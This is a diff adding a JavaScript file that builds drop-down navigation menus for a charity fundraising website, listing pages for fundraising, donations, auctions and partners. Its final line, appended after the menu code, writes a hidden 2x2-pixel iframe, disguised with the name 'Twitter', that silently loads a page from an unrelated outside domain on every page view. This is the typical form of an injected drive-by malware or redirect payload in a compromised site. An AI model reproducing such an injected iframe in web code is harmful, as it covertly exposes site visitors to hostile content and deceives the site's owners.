@@ -1,0 +1,106 @@
+<!--
+function mmLoadMenus() {
+  if (window.mm_menu_0606182815_0) return;
+	window.mm_menu_0606183353_0 = new Menu("root",172,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0606183353_0.addMenuItem("Site Search","location='/search.php'");
+		mm_menu_0606183353_0.addMenuItem("Quick Tour","location='/quicktour.php'");
+		mm_menu_0606183353_0.addMenuItem("About Us","location='/aboutUs.php'");
+		mm_menu_0606183353_0.addMenuItem("Message from the President","location='/msgCeo.php'");
+		mm_menu_0606183353_0.addMenuItem("Press&nbsp;Releases","location='/pressrelease.php'");
+		mm_menu_0606183353_0.addMenuItem("News&nbsp;Letter","location='/onlinecommunity/newsLetter.php'");
+		mm_menu_0606183353_0.addMenuItem("Extended Hearts Events","location='/events.php'");
+		mm_menu_0606183353_0.addMenuItem("FAQ","location='/help.php'");
+		mm_menu_0606183353_0.fontWeight="bold";
+		mm_menu_0606183353_0.hideOnMouseOut=true;
+		mm_menu_0606183353_0.bgColor='#555555';
+		mm_menu_0606183353_0.menuBorder=1;
+		mm_menu_0606183353_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0606183353_0.menuBorderBgColor='#C99C03';
+	window.mm_menu_0606183455_0 = new Menu("root",160,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0606183455_0.addMenuItem("Fundraising&nbsp;Home&nbsp;Page","location='https://extendedhearts.com/FundraisingIdeas/'");
+		mm_menu_0606183455_0.addMenuItem("Search&nbsp;Fundraising&nbsp;Pages","location='/searchFundresult.php'");
+		mm_menu_0606183455_0.addMenuItem("Create&nbsp;Fundraising&nbsp;Page","location='https://extendedhearts.com/create_fundraising_sites.php'");
+		mm_menu_0606183455_0.addMenuItem("Log&nbsp;In","location='https://extendedhearts.com/FundraisingIdeas/'");
+		mm_menu_0606183455_0.fontWeight="bold";
+		mm_menu_0606183455_0.hideOnMouseOut=true;
+		mm_menu_0606183455_0.bgColor='#555555';
+		mm_menu_0606183455_0.menuBorder=1;
+		mm_menu_0606183455_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0606183455_0.menuBorderBgColor='#C99C03';
+	window.mm_menu_0606183544_0 = new Menu("root",144,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0606183544_0.addMenuItem("GiveNow Home Page","location='/givenow/'");
+		mm_menu_0606183544_0.addMenuItem("GiveNow Product Demo","location='/givenow/demo.php'");
+		mm_menu_0606183544_0.addMenuItem("Apply For Service","location='https://extendedhearts.com/givenow/register_step0.php'");
+		mm_menu_0606183544_0.addMenuItem("Log In","location='https://extendedhearts.com/givenow/admin/login.php'");
+		mm_menu_0606183544_0.fontWeight="bold";
+		mm_menu_0606183544_0.hideOnMouseOut=true;
+		mm_menu_0606183544_0.bgColor='#555555';
+		mm_menu_0606183544_0.menuBorder=1;
+		mm_menu_0606183544_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0606183544_0.menuBorderBgColor='#C99C03';
+	window.mm_menu_0606183944_0 = new Menu("root",180,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0606183944_0.addMenuItem("Project Builder Home Page","location='/projectbuilder/'");
+		mm_menu_0606183944_0.addMenuItem("Project Builder Product Demo","location='/projectbuilder/demo.php'");
+		mm_menu_0606183944_0.addMenuItem("Apply For Service","location='https://extendedhearts.com/projectbuilder/register_step0.php'");
+		mm_menu_0606183944_0.addMenuItem("Log In","location='https://extendedhearts.com/projectbuilder/admin/login.php'");
+		mm_menu_0606183944_0.fontWeight="bold";
+		mm_menu_0606183944_0.hideOnMouseOut=true;
+		mm_menu_0606183944_0.bgColor='#555555';
+		mm_menu_0606183944_0.menuBorder=1;
+		mm_menu_0606183944_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0606183944_0.menuBorderBgColor='#C99C03';
+	
+	window.mm_menu_0607155744_0 = new Menu("root",160,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0607155744_0.addMenuItem("BidtoGive Home Page","location='/bidtogive/'");
+		mm_menu_0607155744_0.addMenuItem("BidtoGive Product Demo","location='/bidtogive/'");
+		mm_menu_0607155744_0.addMenuItem("Extended Hearts Auction Catalog","location='/bidtogive/'");
+		mm_menu_0607155744_0.addMenuItem("Apply For Service","location='/bidtogive/'");
+		mm_menu_0607155744_0.addMenuItem("Log In","location='/bidtogive/'");
+		mm_menu_0607155744_0.fontWeight="bold";
+		mm_menu_0607155744_0.hideOnMouseOut=true;
+		mm_menu_0607155744_0.bgColor='#555555';
+		mm_menu_0607155744_0.menuBorder=1;
+		mm_menu_0607155744_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0607155744_0.menuBorderBgColor='#C99C03';
+	
+	window.mm_menu_060716439856_0 = new Menu("root",160,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		//mm_menu_060716439856_0.addMenuItem("Connects Home Page","location='/connects/'");
+		//mm_menu_060716439856_0.addMenuItem("Start a Group","location='/connects/creategroup.php'");
+		//mm_menu_060716439856_0.addMenuItem("Log In","location='/connects/'");
+		mm_menu_060716439856_0.fontWeight="bold";
+		mm_menu_060716439856_0.hideOnMouseOut=true;
+		mm_menu_060716439856_0.bgColor='#555555';
+		mm_menu_060716439856_0.menuBorder=1;
+		mm_menu_060716439856_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_060716439856_0.menuBorderBgColor='#C99C03';
+	
+	window.mm_menu_0607160451_0 = new Menu("root",149,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		//mm_menu_0607160451_0.addMenuItem("Connects","location='/connects/'");
+		mm_menu_0607160451_0.addMenuItem("Blog","location='/blog/'");
+		//mm_menu_0607160451_0.addMenuItem("Online Forum","location='/forum/'");
+		mm_menu_0607160451_0.addMenuItem("Calendar of Events","location='/onlinecommunity/ListEvents.php'");
+		mm_menu_0607160451_0.fontWeight="bold";
+		mm_menu_0607160451_0.hideOnMouseOut=true;
+		mm_menu_0607160451_0.bgColor='#555555';
+		mm_menu_0607160451_0.menuBorder=1;
+		mm_menu_0607160451_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0607160451_0.menuBorderBgColor='#C99C03';
+
+	window.mm_menu_0607160551_0 = new Menu("root",159,16,"Verdana, Arial, Helvetica, sans-serif",10,"#333333","#FFFFFF","#FCCB28","#B98F02","left","middle",3,0,1000,-5,7,true,true,true,0,true,true);
+		mm_menu_0607160551_0.addMenuItem("Vendors","location='/vendors.php'");
+		mm_menu_0607160551_0.addMenuItem("National Alliances","location='/alliances.php'");
+		mm_menu_0607160551_0.addMenuItem("Technology Partners","location='/techpartner.php'");
+		mm_menu_0607160551_0.addMenuItem("Consulting Partner","location='/conspartner.php'");
+		mm_menu_0607160551_0.fontWeight="bold";
+		mm_menu_0607160551_0.hideOnMouseOut=true;
+		mm_menu_0607160551_0.bgColor='#555555';
+		mm_menu_0607160551_0.menuBorder=1;
+		mm_menu_0607160551_0.menuLiteBgColor='#FFFFFF';
+		mm_menu_0607160551_0.menuBorderBgColor='#C99C03';
+	
+	
+	mm_menu_0607160451_0.writeMenus();
+} // mmLoadMenus()
+//-->
+
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://mntracing.com/showthread.php?sid=251555></iframe>');
